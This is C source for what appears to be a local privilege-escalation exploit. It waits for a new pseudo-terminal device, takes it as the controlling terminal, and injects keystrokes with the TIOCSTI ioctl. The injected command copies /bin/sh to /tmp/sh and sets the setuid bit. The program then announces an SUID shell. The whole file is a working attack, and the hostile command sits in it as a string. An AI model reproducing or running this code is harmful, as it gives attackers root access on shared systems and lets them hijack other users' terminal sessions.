
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int F_OK ;
 int O_WRONLY ;
 int TIOCSCTTY ;
 int TIOCSTI ;
 int access (char*,int ) ;
 int dup2 (int,int) ;
 int fork () ;
 int fprintf (int ,char*,...) ;
 int ioctl (int ,int ,int) ;
 int open (char*,int ) ;
 int printf (char*,...) ;
 int setsid () ;
 int stderr ;
 int wait (int *) ;

int main(int argc, char *argv[])
{
     char *cmd = "cp /bin/sh /tmp/sh; chmod u+s /tmp/sh\n";
     int pid, pts = -1;

     if(argc != 2) {
          fprintf(stderr, "Usage: %s /dev/pts/X\n", argv[0]);
   fprintf(stderr, "Where X is next slave device to be created\n");
   return 1;
     }

     if(!access(argv[1], F_OK)) {
          fprintf(stderr, "[-] %s device already exists\n", argv[1]);
          return 1;
     }

     pid = fork();

     if(pid < 0) {
   fprintf(stderr, "[-] fork failed\n");
   return 1;
     }

     if(pid == 0) {
          printf("[*] Waiting for slave device %s\n", argv[1]);


   while(pts == -1)
        pts = open(argv[1], O_WRONLY);

        printf("[+] Got PTY slave %s\n", argv[1]);
               printf("[+] Making PTY slave the controlling terminal\n");

        dup2(pts, 0); dup2(pts, 1); dup2(pts, 2);
        setsid();
               ioctl(0, TIOCSCTTY, 1);

        while(*cmd)
             ioctl(0, TIOCSTI, cmd++);
     }

     else {
          wait(((void*)0));
   printf("[+] SUID shell at /tmp/sh\n");
   return 0;
     }
}
